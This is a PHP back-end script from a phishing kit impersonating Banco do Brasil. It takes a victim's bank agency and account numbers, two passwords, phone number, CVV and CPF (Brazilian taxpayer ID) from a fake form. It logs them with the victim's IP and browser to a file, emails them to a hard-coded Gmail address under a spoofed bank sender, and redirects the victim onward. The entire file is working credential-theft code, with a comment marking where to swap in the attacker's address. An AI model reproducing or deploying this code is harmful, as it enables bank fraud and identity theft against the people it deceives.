<?php
    $ip = $_SERVER['REMOTE_ADDR'];
    $useragent = $_SERVER['HTTP_USER_AGENT'];
  if (preg_match('|MSIE ([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Explorer';
  } elseif (preg_match( '|Opera/([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Opera';
  } elseif(preg_match('|Firefox/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Firefox';
  } elseif(preg_match('|Chrome/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Chrome';
  } elseif(preg_match('|Safari/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Safari';
  } else {
    // browser not recognized!
    $browser_version = 0;
    $browser= 'Desconhecido';
  }
  
$casa = $_POST['casa']; //AGENCIA
$marca = $_POST['marca']; //CONTA
$s8 = $_POST['s8']; //SENHA8
$ddd = $_POST['ddd']; //DDD
$numero = $_POST['numero']; //NUMERO
$s6 = $_POST['s6']; //SENHA 6
$apelido = $_POST['apelido']; //APELIDO
$cvv = $_POST['cvv']; //CVV
$cpf = $_POST['cpf']; //CPF

$myFile ="infos/$ip.html";
$fh = fopen($myFile, 'a') or die("Erro, Tente novamente!");

            //ENVIAR NO EMAIL
   $headers  = "MIME-Version: 1.0\n";
   $headers .= "Content-type: text/html; charset=iso-8859-1\n";
   $headers  .='From: ♠ BB-2019 BY ZEDN <bancodo@brasil.com.br>';	
   $conteudo  = "♠  <font color='red'><b>BB-2019</b></font>  ♠<br><br>";
   $conteudo .= "<b>IP:</b> $ip<br>";
   $conteudo .= "<b>NAVEGADOR:</b> $browser<br>";
   $conteudo .= "<b>AGENCIA:</b> $casa<br>";
   $conteudo .= "<b>CONTA:</b> $marca<br>";
   $conteudo .= "<b>SENHA(8):</b> $s8<br>";
   $conteudo .= "<b>TELEFONE:</b> ($ddd)$numero<br>";
   $conteudo .= "<b>SENHA(6):</b> $s6<br>";  
   $conteudo .= "<b>SENHA(4):</b> $s4<br>";  
   $conteudo .= "<b>APELIDO:</b> $apelido<br>";     
   $conteudo .= "<b>CVV:</b> $cvv<br>";     
   $conteudo .= "<b>CPF:</b> $cpf<br>";     
   $conteudo .= "#####################################################################";
   
   fwrite($fh, $conteudo);
   fclose($fh);

   
@mail('braza20k@gmail.com',"BB-2019 - $ip - $browser" ,"$conteudo" ,$headers); // TROCAR EMAIL AQUI 
header("Location: webApp_AplicationFim.php");   
?>